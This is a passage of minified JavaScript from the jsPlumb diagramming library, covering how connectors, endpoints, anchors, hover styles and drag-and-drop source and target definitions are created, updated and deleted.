_=this._jsPlumb.types.indexOf(o[i]);-1!==_?(u(this,_),this._jsPlumb.types.splice(_,1)):this._jsPlumb.types.push(o[i])}w(this,t,e)}},applyType:function(n,t){if(this.setPaintStyle(n.paintStyle,t),this.setHoverPaintStyle(n.hoverPaintStyle,t),n.parameters)for(var e in n.parameters)this.setParameter(e,n.parameters[e]);this._jsPlumb.paintStyleInUse=this.getPaintStyle()},setPaintStyle:function(n,t){this._jsPlumb.paintStyle=n,this._jsPlumb.paintStyleInUse=this._jsPlumb.paintStyle,o(this),t||this.repaint()},getPaintStyle:function(){return this._jsPlumb.paintStyle},setHoverPaintStyle:function(n,t){this._jsPlumb.hoverPaintStyle=n,o(this),t||this.repaint()},getHoverPaintStyle:function(){return this._jsPlumb.hoverPaintStyle},destroy:function(n){(n||null==this.typeId)&&(this.cleanupListeners(),this.clone=null,this._jsPlumb=null)},isHover:function(){return this._jsPlumb.hover},setHover:function(n,t,o){if(this._jsPlumb&&!this._jsPlumb.instance.currentlyDragging&&!this._jsPlumb.instance.isHoverSuspended()){this._jsPlumb.hover=n;var i=n?"addClass":"removeClass";null!=this.canvas&&(null!=this._jsPlumb.instance.hoverClass&&this._jsPlumb.instance[i](this.canvas,this._jsPlumb.instance.hoverClass),null!=this._jsPlumb.hoverClass&&this._jsPlumb.instance[i](this.canvas,this._jsPlumb.hoverClass)),null!=this._jsPlumb.hoverPaintStyle&&(this._jsPlumb.paintStyleInUse=n?this._jsPlumb.hoverPaintStyle:this._jsPlumb.paintStyle,this._jsPlumb.instance.isSuspendDrawing()||(o=o||e(),this.repaint({timestamp:o,recalc:!1}))),this.getAttachedElements&&!t&&function(n,t,e,o){var i=n.getAttachedElements();if(i)for(var r=0,d=i.length;r<d;r++)o&&o===i[r]||i[r].setHover(t,!0,e)}(this,n,e(),this)}}});var c=0,B=function(){var n=c+1;return c++,n},h=n.jsPlumbInstance=function(o){this.version="2.6.7",o&&j.extend(this.Defaults,o),this.logEnabled=this.Defaults.LogEnabled,this._connectionTypes={},this._endpointTypes={},t.EventGenerator.apply(this);var r=this,_=B(),s=r.bind,w={},u=1,c=function(n){if(null==n)return null;if(3===n.nodeType||8===n.nodeType)return{el:n,text:!0};var e=r.getElement(n);return{el:e,id:t.isString(n)&&null==e?n:W(e)}};for(var h in this.getInstanceIndex=function(){return _},this.setZoom=function(n,t){return u=n,r.fire("zoom",u),t&&r.repaintEverything(),!0},this.getZoom=function(){return u},this.Defaults)w[h]=this.Defaults[h];var p,f=[];this.unbindContainer=function(){if(null!=p&&f.length>0)for(var n=0;n<f.length;n++)r.off(p,f[n][0],f[n][1])},this.setContainer=function(n){this.unbindContainer(),n=this.getElement(n),this.select().each(function(t){t.moveParent(n)}),this.selectEndpoints().each(function(t){t.moveParent(n)});var t=p;p=n,f.length=0;for(var e={endpointclick:"endpointClick",endpointdblclick:"endpointDblClick"},o=function(n,t,o){var i=t.srcElement||t.target,d=(i&&i.parentNode?i.parentNode._jsPlumb:null)||(i?i._jsPlumb:null)||(i&&i.parentNode&&i.parentNode.parentNode?i.parentNode.parentNode._jsPlumb:null);if(d){d.fire(n,d,t);var _=o&&e[o+n]||n;r.fire(_,d.component||d,t)}},d=function(n,t,e){f.push([n,e]),r.on(p,n,t,e)},_=function(n){d(n,".jtk-connector",function(t){o(n,t)}),d(n,".jtk-endpoint",function(t){o(n,t,"endpoint")}),d(n,".jtk-overlay",function(t){o(n,t)})},s=0;s<i.length;s++)_(i[s]);for(var a in y){var w=y[a].el;w.parentNode===t&&(t.removeChild(w),p.appendChild(w))}},this.getContainer=function(){return p},this.bind=function(n,t){"ready"===n&&m?t():s.apply(r,[n,t])},r.importDefaults=function(n){for(var t in n)r.Defaults[t]=n[t];return n.Container&&r.setContainer(n.Container),r},r.restoreDefaults=function(){return r.Defaults=j.extend({},w),r};var g=null,m=!1,v=[],C={},b={},y={},D={},P={},E={},x=!1,A=[],S=!1,I=null,k=this.Defaults.Scope,T=1,M=function(){return""+T++},N=function(n,t){p?p.appendChild(n):t?this.getElement(t).appendChild(n):this.appendToRoot(n)}.bind(this),O=function(n,t,o,i){if(!S){var d,_=W(n),s=r.getDragManager();s&&(d=s.getElementsForDraggable(_)),null==o&&(o=e());var a=_n({elId:_,offset:t,recalc:!1,timestamp:o});if(d&&a&&a.o)for(var w in d)_n({elId:d[w].id,offset:{left:a.o.left+d[w].offset.left,top:a.o.top+d[w].offset.top},recalc:!1,timestamp:o});if(r.anchorManager.redraw(_,t,o,null,i),d)for(var l in d)r.anchorManager.redraw(d[l].id,t,o,d[l].offset,i,!0)}},F=function(n){return b[n]},L=function(n,e,o,i,d){if(!j.headless&&null!=e&&e&&j.isDragSupported(n,r)){var _=o||r.Defaults.DragOptions;if(_=j.extend({},_),j.isAlreadyDraggable(n,r))o.force&&r.initDraggable(n,_);else{var s=j.dragEvents.drag,a=j.dragEvents.stop,w=j.dragEvents.start,l=!1;dn(i,n),_[w]=t.wrap(_[w],function(){if(r.setHoverSuspended(!0),r.select({source:n}).addClass(r.elementDraggingClass+" "+r.sourceElementDraggingClass,!0),r.select({target:n}).addClass(r.elementDraggingClass+" "+r.targetElementDraggingClass,!0),r.setConnectionBeingDragged(!0),_.canDrag)return o.canDrag()},!1),_[s]=t.wrap(_[s],function(){var t=r.getUIPosition(arguments,r.getZoom());null!=t&&(O(n,t,null,!0),l&&r.addClass(n,"jtk-dragged"),l=!0)}),_[a]=t.wrap(_[a],function(){for(var n,t=arguments[0].selection,e=function(t){null!=t[1]&&(n=r.getUIPosition([{el:t[2].el,pos:[t[1].left,t[1].top]}]),O(t[2].el,n)),r.removeClass(t[0],"jtk-dragged"),r.select({source:t[2].el}).removeClass(r.elementDraggingClass+" "+r.sourceElementDraggingClass,!0),r.select({target:t[2].el}).removeClass(r.elementDraggingClass+" "+r.targetElementDraggingClass,!0),r.getDragManager().dragEnded(t[2].el)},o=0;o<t.length;o++)e(t[o]);l=!1,r.setHoverSuspended(!1),r.setConnectionBeingDragged(!1)});var u=W(n);E[u]=!0;var c=E[u];_.disabled=null!=c&&!c,r.initDraggable(n,_),r.getDragManager().register(n),d&&r.fire("elementDraggable",{el:n,options:_})}}},R=function(n,e){var o=j.extend({},n);if(e&&j.extend(o,e),o.source&&(o.source.endpoint?o.sourceEndpoint=o.source:o.source=r.getElement(o.source)),o.target&&(o.target.endpoint?o.targetEndpoint=o.target:o.target=r.getElement(o.target)),n.uuids&&(o.sourceEndpoint=F(n.uuids[0]),o.targetEndpoint=F(n.uuids[1])),o.sourceEndpoint&&o.sourceEndpoint.isFull())t.log(r,"could not add connection; source endpoint is full");else{if(!o.targetEndpoint||!o.targetEndpoint.isFull()){if(!o.type&&o.sourceEndpoint&&(o.type=o.sourceEndpoint.connectionType),o.sourceEndpoint&&o.sourceEndpoint.connectorOverlays){o.overlays=o.overlays||[];for(var i=0,d=o.sourceEndpoint.connectorOverlays.length;i<d;i++)o.overlays.push(o.sourceEndpoint.connectorOverlays[i])}o.sourceEndpoint&&o.sourceEndpoint.scope&&(o.scope=o.sourceEndpoint.scope),!o["pointer-events"]&&o.sourceEndpoint&&o.sourceEndpoint.connectorPointerEvents&&(o["pointer-events"]=o.sourceEndpoint.connectorPointerEvents);var _=function(n,t,e){return r.addEndpoint(n,function(n,t){var e=j.extend({},n);for(var o in t)t[o]&&(e[o]=t[o]);return e}(t,{anchor:o.anchors?o.anchors[e]:o.anchor,endpoint:o.endpoints?o.endpoints[e]:o.endpoint,paintStyle:o.endpointStyles?o.endpointStyles[e]:o.endpointStyle,hoverPaintStyle:o.endpointHoverStyles?o.endpointHoverStyles[e]:o.endpointHoverStyle}))},s=function(n,t,e,i){if(o[n]&&!o[n].endpoint&&!o[n+"Endpoint"]&&!o.newConnection){var r=e[W(o[n])];if(r=r?r[i]:null){if(!r.enabled)return!1;var d=null!=r.endpoint&&r.endpoint._jsPlumb?r.endpoint:_(o[n],r.def,t);if(d.isFull())return!1;o[n+"Endpoint"]=d,!o.scope&&r.def.scope&&(o.scope=r.def.scope),r.uniqueEndpoint?r.endpoint?d.finalEndpoint=r.endpoint:(r.endpoint=d,d.setDeleteOnEmpty(!1)):d.setDeleteOnEmpty(!0),0===t&&r.def.connectorOverlays&&(o.overlays=o.overlays||[],Array.prototype.push.apply(o.overlays,r.def.connectorOverlays))}}};return!1!==s("source",0,this.sourceEndpointDefinitions,o.type||"default")&&!1!==s("target",1,this.targetEndpointDefinitions,o.type||"default")?(o.sourceEndpoint&&o.targetEndpoint&&(function(n,t){for(var e=n.scope.split(/\s/),o=t.scope.split(/\s/),i=0;i<e.length;i++)for(var r=0;r<o.length;r++)if(o[r]===e[i])return!0;return!1}(o.sourceEndpoint,o.targetEndpoint)||(o=null)),o):void 0}t.log(r,"could not add connection; target endpoint is full")}}.bind(r),G=function n(t){var e=r.Defaults.ConnectionType||r.getDefaultConnectionType();t._jsPlumb=r,t.newConnection=n,t.newEndpoint=z,t.endpointsByUUID=b,t.endpointsByElement=C,t.finaliseConnection=U,t.id="con_"+M();var o=new e(t);return o.isDetachable()&&(o.endpoints[0].initDraggable("_jsPlumbSource"),o.endpoints[1].initDraggable("_jsPlumbTarget")),o},U=r.finaliseConnection=function(n,t,e,o){if(t=t||{},n.suspendedEndpoint||v.push(n),n.pending=null,n.endpoints[0].isTemporarySource=!1,!1!==o&&r.anchorManager.newConnection(n),O(n.source),!t.doNotFireConnectionEvent&&!1!==t.fireEvent){var i={connection:n,source:n.source,target:n.target,sourceId:n.sourceId,targetId:n.targetId,sourceEndpoint:n.endpoints[0],targetEndpoint:n.endpoints[1]};r.fire("connection",i,e)}},z=function n(t,e){var o=r.Defaults.EndpointType||j.Endpoint,i=j.extend({},t);i._jsPlumb=r,i.newConnection=G,i.newEndpoint=n,i.endpointsByUUID=b,i.endpointsByElement=C,i.fireDetachEvent=Z,i.elementId=e||W(i.source);var d=new o(i);return d.id="ep_"+M(),dn(i.elementId,i.source),j.headless||r.getDragManager().endpointAdded(i.source,e),d},V=function(n,t,e){var o=C[n];if(o&&o.length)for(var i=0,r=o.length;i<r;i++){for(var d=0,_=o[i].connections.length;d<_;d++){if(t(o[i].connections[d]))return}e&&e(o[i])}},H=function(n,t,e){t="block"===t;var o=null;e&&(o=function(n){n.setVisible(t,!0,!0)});var i=c(n);V(i.id,function(n){if(t&&e){var o=n.sourceId===i.id?1:0;n.endpoints[o].isVisible()&&n.setVisible(!0)}else n.setVisible(t)},o)},W=function(n,e,o){if(t.isString(n))return n;if(null==n)return null;var i=r.getAttribute(n,"id");return i&&"undefined"!==i||(2===arguments.length&&void 0!==arguments[1]?i=e:(1===arguments.length||3===arguments.length&&!arguments[2])&&(i="jsPlumb_"+_+"_"+M()),o||r.setAttribute(n,"id",i)),i};this.setConnectionBeingDragged=function(n){x=n},this.isConnectionBeingDragged=function(){return x},this.getManagedElements=function(){return y},this.connectorClass="jtk-connector",this.connectorOutlineClass="jtk-connector-outline",this.editableConnectorClass="jtk-connector-editable",this.connectedClass="jtk-connected",this.hoverClass="jtk-hover",this.endpointClass="jtk-endpoint",this.endpointConnectedClass="jtk-endpoint-connected",this.endpointFullClass="jtk-endpoint-full",this.endpointDropAllowedClass="jtk-endpoint-drop-allowed",this.endpointDropForbiddenClass="jtk-endpoint-drop-forbidden",this.overlayClass="jtk-overlay",this.draggingClass="jtk-dragging",this.elementDraggingClass="jtk-element-dragging",this.sourceElementDraggingClass="jtk-source-element-dragging",this.targetElementDraggingClass="jtk-target-element-dragging",this.endpointAnchorClassPrefix="jtk-endpoint-anchor",this.hoverSourceClass="jtk-source-hover",this.hoverTargetClass="jtk-target-hover",this.dragSelectClass="jtk-drag-select",this.Anchors={},this.Connectors={svg:{}},this.Endpoints={svg:{}},this.Overlays={svg:{}},this.ConnectorRenderers={},this.SVG="svg",this.addEndpoint=function(n,e,o){o=o||{};var i=j.extend({},o);j.extend(i,e),i.endpoint=i.endpoint||r.Defaults.Endpoint,i.paintStyle=i.paintStyle||r.Defaults.EndpointStyle;for(var d=[],_=t.isArray(n)||null!=n.length&&!t.isString(n)?n:[n],s=0,a=_.length;s<a;s++){i.source=r.getElement(_[s]),rn(i.source);var w=W(i.source),l=z(i,w),u=dn(w,i.source).info.o;t.addToList(C,w,l),S||l.paint({anchorLoc:l.anchor.compute({xy:[u.left,u.top],wh:A[w],element:l,timestamp:I}),timestamp:I}),d.push(l)}return 1===d.length?d[0]:d},this.addEndpoints=function(n,e,o){for(var i=[],d=0,_=e.length;d<_;d++){var s=r.addEndpoint(n,e[d],o);t.isArray(s)?Array.prototype.push.apply(i,s):i.push(s)}return i},this.animate=function(n,e,o){if(!this.animationSupported)return!1;o=o||{};var i=r.getElement(n),d=W(i),_=j.animEvents.step,s=j.animEvents.complete;o[_]=t.wrap(o[_],function(){r.revalidate(d)}),o[s]=t.wrap(o[s],function(){r.revalidate(d)}),r.doAnimate(i,e,o)},this.checkCondition=function(n,e){var o=r.getListener(n),i=!0;if(o&&o.length>0){var d=Array.prototype.slice.call(arguments,1);try{for(var _=0,s=o.length;_<s;_++)i=i&&o[_].apply(o[_],d)}catch(e){t.log(r,"cannot check condition ["+n+"]"+e)}}return i},this.connect=function(n,e){var o,i=R(n,e);if(i){if(null==i.source&&null==i.sourceEndpoint)return void t.log("Cannot establish connection - source does not exist");if(null==i.target&&null==i.targetEndpoint)return void t.log("Cannot establish connection - target does not exist");rn(i.source),o=G(i),U(o,i)}return o};var X=[{el:"source",elId:"sourceId",epDefs:"sourceEndpointDefinitions"},{el:"target",elId:"targetId",epDefs:"targetEndpointDefinitions"}],Y=function(n,t,e,o){var i,r,d,_=X[e],s=n[_.elId],a=(n[_.el],n.endpoints[e]),w={index:e,originalSourceId:0===e?s:n.sourceId,newSourceId:n.sourceId,originalTargetId:1===e?s:n.targetId,newTargetId:n.targetId,connection:n};if(t.constructor===j.Endpoint)(i=t).addConnection(n),t=i.element;else if(r=W(t),d=this[_.epDefs][r],r===n[_.elId])i=null;else if(d)for(var l in d){if(!d[l].enabled)return;i=null!=d[l].endpoint&&d[l].endpoint._jsPlumb?d[l].endpoint:this.addEndpoint(t,d[l].def),d[l].uniqueEndpoint&&(d[l].endpoint=i),i.addConnection(n)}else i=n.makeEndpoint(0===e,t,r);return null!=i&&(a.detachFromConnection(n),n.endpoints[e]=i,n[_.el]=i.element,n[_.elId]=i.elementId,w[0===e?"newSourceId":"newTargetId"]=i.elementId,q(w),o||n.repaint()),w.element=t,w}.bind(this);this.setSource=function(n,t,e){var o=Y(n,t,0,e);this.anchorManager.sourceChanged(o.originalSourceId,o.newSourceId,n,o.el)},this.setTarget=function(n,t,e){var o=Y(n,t,1,e);this.anchorManager.updateOtherEndpoint(o.originalSourceId,o.originalTargetId,o.newTargetId,n)},this.deleteEndpoint=function(n,t,e){var o="string"==typeof n?b[n]:n;return o&&r.deleteObject({endpoint:o,dontUpdateHover:t,deleteAttachedObjects:e}),r},this.deleteEveryEndpoint=function(){var n=r.setSuspendDrawing(!0);for(var t in C){var e=C[t];if(e&&e.length)for(var o=0,i=e.length;o<i;o++)r.deleteEndpoint(e[o],!0)}C={},y={},b={},D={},P={},r.anchorManager.reset();var d=r.getDragManager();return d&&d.reset(),n||r.setSuspendDrawing(!1),r};var Z=function(n,t,e){var o=r.Defaults.ConnectionType||r.getDefaultConnectionType(),i=n.constructor===o?{connection:n,source:n.source,target:n.target,sourceId:n.sourceId,targetId:n.targetId,sourceEndpoint:n.endpoints[0],targetEndpoint:n.endpoints[1]}:n;t&&r.fire("connectionDetached",i,e),r.fire("internal.connectionDetached",i,e),r.anchorManager.connectionDetached(i)},q=r.fireMoveEvent=function(n,t){r.fire("connectionMoved",n,t)};this.unregisterEndpoint=function(n){for(var t in n._jsPlumb.uuid&&(b[n._jsPlumb.uuid]=null),r.anchorManager.deleteEndpoint(n),C){var e=C[t];if(e){for(var o=[],i=0,d=e.length;i<d;i++)e[i]!==n&&o.push(e[i]);C[t]=o}C[t].length<1&&delete C[t]}};var $="isDetachAllowed";this.deleteConnection=function(n,e){return!(null==n||(e=e||{},!e.force&&!t.functionChain(!0,!1,[[n.endpoints[0],$,[n]],[n.endpoints[1],$,[n]],[n,$,[n]],[r,"checkCondition",["beforeDetach",n]]]))||(n.setHover(!1),Z(n,!n.pending&&!1!==e.fireEvent,e.originalEvent),n.endpoints[0].detachFromConnection(n),n.endpoints[1].detachFromConnection(n),t.removeWithFunction(v,function(t){return n.id===t.id}),n.cleanup(),n.destroy(),0))},this.deleteEveryConnection=function(n){n=n||{};var t=v.length,e=0;return r.batch(function(){for(var o=0;o<t;o++)e+=r.deleteConnection(v[0],n)?1:0}),e},this.deleteConnectionsForElement=function(n,t){t=t||{},n=r.getElement(n);var e=W(n),o=C[e];if(o&&o.length)for(var i=0,d=o.length;i<d;i++)o[i].deleteEveryConnection(t);return r},this.deleteObject=function(n){var e={endpoints:{},connections:{},endpointCount:0,connectionCount:0},o=!1!==n.deleteAttachedObjects,i=function(t){null!=t&&null==e.connections[t.id]&&(n.dontUpdateHover||null==t._jsPlumb||t.setHover(!1),e.connections[t.id]=t,e.connectionCount++)};for(var d in n.connection?i(n.connection):function(t){if(null!=t&&null==e.endpoints[t.id]&&(n.dontUpdateHover||null==t._jsPlumb||t.setHover(!1),e.endpoints[t.id]=t,e.endpointCount++,o))for(var r=0;r<t.connections.length;r++){var d=t.connections[r];i(d)}}(n.endpoint),e.connections){var _=e.connections[d];if(_._jsPlumb){t.removeWithFunction(v,function(n){return _.id===n.id}),Z(_,!1!==n.fireEvent&&!_.pending,n.originalEvent);var s=null==n.deleteAttachedObjects?null:!n.deleteAttachedObjects;_.endpoints[0].detachFromConnection(_,null,s),_.endpoints[1].detachFromConnection(_,null,s),_.cleanup(!0),_.destroy(!0)}}for(var a in e.endpoints){var w=e.endpoints[a];w._jsPlumb&&(r.unregisterEndpoint(w),w.cleanup(!0),w.destroy(!0))}return e},this.draggable=function(n,t){var e;return a(function(n){(e=c(n)).el&&L(e.el,!0,t,e.id,!0)},n),r},this.droppable=function(n,t){var e;return(t=t||{}).allowLoopback=!1,a(function(n){(e=c(n)).el&&r.initDroppable(e.el,t)},n),r};var J=function(n,t,e){return function(){return function(n,t,e,o){for(var i=0,r=n.length;i<r;i++)n[i][t].apply(n[i],e);return o(n)}(n,t,arguments,e)}},K=function(n,t){return function(){return function(n,t,e){for(var o=[],i=0,r=n.length;i<r;i++)o.push([n[i][t].apply(n[i],e),n[i]]);return o}(n,t,arguments)}},Q=function(n,t){var e=[];if(n)if("string"==typeof n){if("*"===n)return n;e.push(n)}else if(t)e=n;else if(n.length)for(var o=0,i=n.length;o<i;o++)e.push(c(n[o]).id);else e.push(c(n).id);return e},nn=function(n,t,e){return"*"===n||(n.length>0?-1!==n.indexOf(t):!e)};this.getConnections=function(n,t){n?n.constructor===String&&(n={scope:n}):n={};for(var e=n.scope||r.getDefaultScope(),o=Q(e,!0),i=Q(n.source),d=Q(n.target),_=!t&&o.length>1?{}:[],s=function(n,e){if(!t&&o.length>1){var i=_[n];null==i&&(i=_[n]=[]),i.push(e)}else _.push(e)},a=0,w=v.length;a<w;a++){var l=v[a],u=l.proxies&&l.proxies[0]?l.proxies[0].originalEp.elementId:l.sourceId,c=l.proxies&&l.proxies[1]?l.proxies[1].originalEp.elementId:l.targetId;nn(o,l.scope)&&nn(i,u)&&nn(d,c)&&s(l.scope,l)}return _};var tn=function(n,t){var e,o,i={length:n.length,each:function(n,t){return function(e){for(var o=0,i=n.length;o<i;o++)e(n[o]);return t(n)}}(n,t),get:function(n){return function(t){return n[t]}}(n)},r=["setHover","removeAllOverlays","setLabel","addClass","addOverlay","removeOverlay","removeOverlays","showOverlay","hideOverlay","showOverlays","hideOverlays","setPaintStyle","setHoverPaintStyle","setSuspendEvents","setParameter","setParameters","setVisible","repaint","addType","toggleType","removeType","removeClass","setType","bind","unbind"],d=["getLabel","getOverlay","isHover","getParameter","getParameters","getPaintStyle","getHoverPaintStyle","isVisible","hasType","getType","isSuspendEvents"];for(e=0,o=r.length;e<o;e++)i[r[e]]=J(n,r[e],t);for(e=0,o=d.length;e<o;e++)i[d[e]]=K(n,d[e]);return i},en=function n(t){var e=tn(t,n);return j.extend(e,{setEnabled:J(t,"setEnabled",n),setAnchor:J(t,"setAnchor",n),isEnabled:K(t,"isEnabled"),deleteEveryConnection:function(){for(var n=0,e=t.length;n<e;n++)t[n].deleteEveryConnection()},delete:function(){for(var n=0,e=t.length;n<e;n++)r.deleteEndpoint(t[n])}})};this.select=function(n){return(n=n||{}).scope=n.scope||"*",function n(t){var e=tn(t,n);return j.extend(e,{setDetachable:J(t,"setDetachable",n),setReattach:J(t,"setReattach",n),setConnector:J(t,"setConnector",n),delete:function(){for(var n=0,e=t.length;n<e;n++)r.deleteConnection(t[n])},isDetachable:K(t,"isDetachable"),isReattach:K(t,"isReattach")})}(n.connections||r.getConnections(n,!0))},this.selectEndpoints=function(n){(n=n||{}).scope=n.scope||"*";var t=!n.element&&!n.source&&!n.target,e=t?"*":Q(n.element),o=t?"*":Q(n.source),i=t?"*":Q(n.target),r=Q(n.scope,!0),d=[];for(var _ in C){var s=nn(e,_,!0),a=nn(o,_,!0),w="*"!==o,l=nn(i,_,!0),u="*"!==i;if(s||a||l)n:for(var c=0,B=C[_].length;c<B;c++){var h=C[_][c];if(nn(r,h.scope,!0)){var j=w&&o.length>0&&!h.isSource,p=u&&i.length>0&&!h.isTarget;if(j||p)continue n;d.push(h)}}}return en(d)},this.getAllConnections=function(){return v},this.getDefaultScope=function(){return k},this.getEndpoint=F,this.getEndpoints=function(n){return C[c(n).id]||[]},this.getDefaultEndpointType=function(){return j.Endpoint},this.getDefaultConnectionType=function(){return j.Connection},this.getId=W,this.appendElement=N;var on=!1;this.isHoverSuspended=function(){return on},this.setHoverSuspended=function(n){on=n},this.hide=function(n,t){return H(n,"none",t),r},this.idstamp=M;var rn=function(n){if(!p&&n){var t=r.getElement(n);t.offsetParent&&r.setContainer(t.offsetParent)}},dn=r.manage=function(n,t,e){return y[n]||(y[n]={el:t,endpoints:[],connections:[]},y[n].info=_n({elId:n,timestamp:I}),e||r.fire("manageElement",{id:n,info:y[n].info,el:t})),y[n]},_n=this.updateOffset=function(n){var t,e=n.timestamp,o=n.recalc,i=n.offset,d=n.elId;return S&&!e&&(e=I),!o&&e&&e===P[d]?{o:n.offset||D[d],s:A[d]}:(o||!i&&null==D[d]?null!=(t=y[d]?y[d].el:null)&&(A[d]=r.getSize(t),D[d]=r.getOffset(t),P[d]=e):(D[d]=i||D[d],null==A[d]&&null!=(t=y[d].el)&&(A[d]=r.getSize(t)),P[d]=e),D[d]&&!D[d].right&&(D[d].right=D[d].left+A[d][0],D[d].bottom=D[d].top+A[d][1],D[d].width=A[d][0],D[d].height=A[d][1],D[d].centerx=D[d].left+D[d].width/2,D[d].centery=D[d].top+D[d].height/2),{o:D[d],s:A[d]})};this.init=function(){m||(r.Defaults.Container&&r.setContainer(r.Defaults.Container),r.anchorManager=new n.jsPlumb.AnchorManager({jsPlumbInstance:r}),m=!0,r.fire("ready",r))}.bind(this),this.log=g,this.jsPlumbUIComponent=l,this.makeAnchor=function(){var e,o=function(t,e){if(n.jsPlumb.Anchors[t])return new n.jsPlumb.Anchors[t](e);if(!r.Defaults.DoNotThrowErrors)throw{msg:"jsPlumb: unknown anchor type '"+t+"'"}};if(0===arguments.length)return null;var i=arguments[0],d=arguments[1],_=(arguments[2],null);if(i.compute&&i.getOrientation)return i;if("string"==typeof i)_=o(arguments[0],{elementId:d,jsPlumbInstance:r});else if(t.isArray(i))if(t.isArray(i[0])||t.isString(i[0]))2===i.length&&t.isObject(i[1])?t.isString(i[0])?(e=n.jsPlumb.extend({elementId:d,jsPlumbInstance:r},i[1]),_=o(i[0],e)):(e=n.jsPlumb.extend({elementId:d,jsPlumbInstance:r,anchors:i[0]},i[1]),_=new n.jsPlumb.DynamicAnchor(e)):_=new j.DynamicAnchor({anchors:i,selector:null,elementId:d,jsPlumbInstance:r});else{var s={x:i[0],y:i[1],orientation:i.length>=4?[i[2],i[3]]:[0,0],offsets:i.length>=6?[i[4],i[5]]:[0,0],elementId:d,jsPlumbInstance:r,cssClass:7===i.length?i[6]:null};(_=new n.jsPlumb.Anchor(s)).clone=function(){return new n.jsPlumb.Anchor(s)}}return _.id||(_.id="anchor_"+M()),_},this.makeAnchors=function(e,o,i){for(var d=[],_=0,s=e.length;_<s;_++)"string"==typeof e[_]?d.push(n.jsPlumb.Anchors[e[_]]({elementId:o,jsPlumbInstance:i})):t.isArray(e[_])&&d.push(r.makeAnchor(e[_],o,i));return d},this.makeDynamicAnchor=function(t,e){return new n.jsPlumb.DynamicAnchor({anchors:t,selector:e,elementId:null,jsPlumbInstance:r})},this.targetEndpointDefinitions={},this.sourceEndpointDefinitions={};var sn=function(e,o,i,d,_){var s=new l(o),a=o._jsPlumb.EndpointDropHandler({jsPlumb:r,enabled:function(){return e.def.enabled},isFull:function(){var n=r.select({target:e.id}).length;return e.def.maxConnections>0&&n>=e.def.maxConnections},element:e.el,elementId:e.id,isSource:d,isTarget:_,addClass:function(n){r.addClass(e.el,n)},removeClass:function(n){r.removeClass(e.el,n)},onDrop:function(n){n.endpoints[0].anchor.locked=!1},isDropAllowed:function(){return s.isDropAllowed.apply(s,arguments)},isRedrop:function(n){return null!=n.suspendedElement&&null!=n.suspendedEndpoint&&n.suspendedEndpoint.element===e.el},getEndpoint:function(t){var i=e.def.endpoint;if(null==i||null==i._jsPlumb){var d=r.deriveEndpointAndAnchorSpec(t.getType().join(" "),!0),_=d.endpoints?n.jsPlumb.extend(o,{endpoint:e.def.def.endpoint||d.endpoints[1]}):o;d.anchors&&(_=n.jsPlumb.extend(_,{anchor:e.def.def.anchor||d.anchors[1]})),(i=r.addEndpoint(e.el,_))._mtNew=!0}if(o.uniqueEndpoint&&(e.def.endpoint=i),i.setDeleteOnEmpty(!0),t.isDetachable()&&i.initDraggable(),null!=i.anchor.positionFinder){var s=r.getUIPosition(arguments,r.getZoom()),a=r.getOffset(e.el),w=r.getSize(e.el),l=null==s?[0,0]:i.anchor.positionFinder(s,a,w,i.anchor.constructorParams);i.anchor.x=l[0],i.anchor.y=l[1]}return i},maybeCleanup:function(n){n._mtNew&&0===n.connections.length?r.deleteObject({endpoint:n}):delete n._mtNew}}),w=n.jsPlumb.dragEvents.drop;return i.scope=i.scope||o.scope||r.Defaults.Scope,i[w]=t.wrap(i[w],a,!0),_&&(i[n.jsPlumb.dragEvents.over]=function(){return!0}),!1===o.allowLoopback&&(i.canDrop=function(n){return n.getDragElement()._jsPlumbRelatedElement!==e.el}),r.initDroppable(e.el,i,"internal"),a};this.makeTarget=function(t,e,o){var i=n.jsPlumb.extend({_jsPlumb:this},o);n.jsPlumb.extend(i,e);for(var d=i.maxConnections||-1,_=function(t){var e=c(t),o=e.id,_=n.jsPlumb.extend({},i.dropOptions||{}),s=i.connectionType||"default";this.targetEndpointDefinitions[o]=this.targetEndpointDefinitions[o]||{},rn(o),e.el._isJsPlumbGroup&&null==_.rank&&(_.rank=-1);var a={def:n.jsPlumb.extend({},i),uniqueEndpoint:i.uniqueEndpoint,maxConnections:d,enabled:!0};i.createEndpoint&&(a.uniqueEndpoint=!0,a.endpoint=r.addEndpoint(t,a.def),a.endpoint.setDeleteOnEmpty(!1)),e.def=a,this.targetEndpointDefinitions[o][s]=a,sn(e,i,_,!0===i.isSource,!0),e.el._katavorioDrop[e.el._katavorioDrop.length-1].targetDef=a}.bind(this),s=t.length&&t.constructor!==String?t:[t],a=0,w=s.length;a<w;a++)_(s[a]);return this},this.unmakeTarget=function(n,t){var e=c(n);return r.destroyDroppable(e.el,"internal"),t||delete this.targetEndpointDefinitions[e.id],this},this.makeSource=function(e,o,i){var d=n.jsPlumb.extend({_jsPlumb:this},i);n.jsPlumb.extend(d,o);var _=d.connectionType||"default",s=r.deriveEndpointAndAnchorSpec(_);d.endpoint=d.endpoint||s.endpoints[0],d.anchor=d.anchor||s.anchors[0];for(var a=d.maxConnections||-1,w=d.onMaxConnections,l=function(o){var i=o.id,s=this.getElement(o.el);this.sourceEndpointDefinitions[i]=this.sourceEndpointDefinitions[i]||{},rn(i);var l={def:n.jsPlumb.extend({},d),uniqueEndpoint:d.uniqueEndpoint,maxConnections:a,enabled:!0};d.createEndpoint&&(l.uniqueEndpoint=!0,l.endpoint=r.addEndpoint(e,l.def),l.endpoint.setDeleteOnEmpty(!1)),this.sourceEndpointDefinitions[i][_]=l,o.def=l;var c=n.jsPlumb.dragEvents.stop,B=n.jsPlumb.dragEvents.drag,h=n.jsPlumb.extend({},d.dragOptions||{}),j=h.drag,p=h.stop,f=null,g=!1;h.scope=h.scope||d.scope,h[B]=t.wrap(h[B],function(){j&&j.apply(this,arguments),g=!1}),h[c]=t.wrap(h[c],function(){if(p&&p.apply(this,arguments),this.currentlyDragging=!1,null!=f._jsPlumb){var n=d.anchor||this.Defaults.Anchor,t=f.anchor,e=f.connections[0],o=this.makeAnchor(n,i,this),_=f.element;if(null!=o.positionFinder){var s=r.getOffset(_),a=this.getSize(_),w={left:s.left+t.x*a[0],top:s.top+t.y*a[1]},l=o.positionFinder(w,s,a,o.constructorParams);o.x=l[0],o.y=l[1]}f.setAnchor(o,!0),f.repaint(),this.repaint(f.elementId),null!=e&&this.repaint(e.targetId)}}.bind(this));var m=function(e){if(3!==e.which&&2!==e.button){var l=this.sourceEndpointDefinitions[i][_];if(l.enabled){if(i=this.getId(this.getElement(o.el)),d.filter&&!1===(t.isString(d.filter)?function(n,t,e,o,i){for(var 